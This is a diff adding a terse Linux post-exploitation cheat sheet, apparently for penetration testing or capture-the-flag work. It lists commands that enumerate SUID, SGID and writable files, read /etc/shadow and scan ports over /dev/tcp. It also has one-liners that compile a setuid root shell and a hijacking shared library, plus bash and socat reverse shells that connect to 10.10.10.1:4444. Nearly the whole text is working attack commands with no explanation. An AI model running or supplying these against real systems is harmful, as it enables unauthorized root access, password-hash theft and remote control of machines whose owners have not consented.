@@ -1,0 +1,84 @@
+ 
+SUID:
+find / -path /proc -prune -o -path /sys -prune -o -path /run -prune -o -path /snap -prune -o -type f -perm /4000 -ls 2>/dev/null | sort -n -k10,10 -k8,8M -k9,9 | column -t
+
+SGID:
+find / -path /proc -prune -o -path /sys -prune -o -path /run -prune -o -path /snap -prune -o -type f -perm /2000 -ls 2>/dev/null | sort -n -k10,10 -k8,8M -k9,9 | column -t
+
+
+writable files:
+find / -path /proc -prune -o -path /sys -prune -o -path /run -prune -o -path /snap -prune -o -path /home/$(whoami) -prune -o -path /lib/systemd -prune -o -path /var/lib/lxcfs -prune -o -writable -ls 2>/dev/null | column -t
+
+files owned by current user:
+find / -path /proc -prune -o -path /sys -prune -o -path /run -prune -o -path /snap -prune -o -path /home/$(whoami) -prune -o -path /lib/systemd -prune -o -path /var/lib/lxcfs -prune -o \( -uid $(id -u) -o -gid $(id -g) \) -ls 2>/dev/null  | column -t
+
+files not owned by me, readable by me and not world readable:
+find / -path /proc -prune -o -path /sys -prune -o ! -uid $(id -u) -readable ! -perm -004 -ls 2>/dev/null | sort -n -k10,10 -k8,8M -k9,9 | column -t
+
+
+files modified between two dates:
+find / -newermt 2017-11-25 ! -newermt 2018-01-01 -type f -ls 2>/dev/null | sort -n -k10,10 -k8,8M -k9,9 | column -t | less
+
+interesting cron jobs:
+find /etc/cron* -type f -readable -ls 2>/dev/null | sort -n -k10,10 -k8,8M -k9,9 | column -t | less
+grep "CRON.*CMD" /var/log/ -R 2>/dev/null
+
+non empty groups:
+grep -ve ':$' /etc/group
+
+non boring users:
+grep -v 'false\|nologin$' /etc/passwd
+
+shadow entries
+grep -ve ':[*!]' /etc/shadow
+
+
+non kernel processes:
+ps -ef | grep -v ']$'
+
+
+dirty port scan:
+seq 1 65535 | xargs -I {} -P 100 sh -c 'timeout .1 bash -c "echo > /dev/tcp/10.10.10.1/{}" && echo {}' 2>/dev/null
+
+
+chagelogs:
+http://changelogs.ubuntu.com/changelogs/pool/main/p/postfix/postfix_3.1.0-3/changelog
+https://metadata.ftp-master.debian.org/changelogs/main/o/openssh/openssh_7.9p1-10+deb10u2_changelog
+
+
+compile a setuid binary:
+gcc -o shell -x c - <<< 'void main(){setreuid(0,0);setregid(0,0);execl("/bin/bash","bash","-i",0);}'
+
+in case its possible to control the load path of a suid binary (possibly using _init will word instead of attribute):
+echo 'void __attribute__((constructor)) i(void) {setreuid(0,0);setregid(0,0);execl("/bin/bash","bash","-i",0);}' | gcc -x c - -shared -o libcap.so.2 -fPIC
+
+list mounted volumes/files in docker:
+mount | grep mapper
+
+
+
+
+
+
+
+
+
+
+
+reverse shell
+
+export TERM=xterm-256color
+python -c 'import pty;pty.spawn("bash")'
+source /etc/skel/.bashrc
+
+
+also, easier than python is (command is optional):
+script -c "bash -i" /dev/null
+
+this works as a 1 liner as reverse shell:
+bash -c 'script /dev/null >&/dev/tcp/10.10.10.1/4444 <&1'
+bash -c 'script -c bash /dev/null >&/dev/tcp/10.10.10.1/4444 <&1 &'
+
+echo export TERM=$TERM; stty -a; socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.1:4444
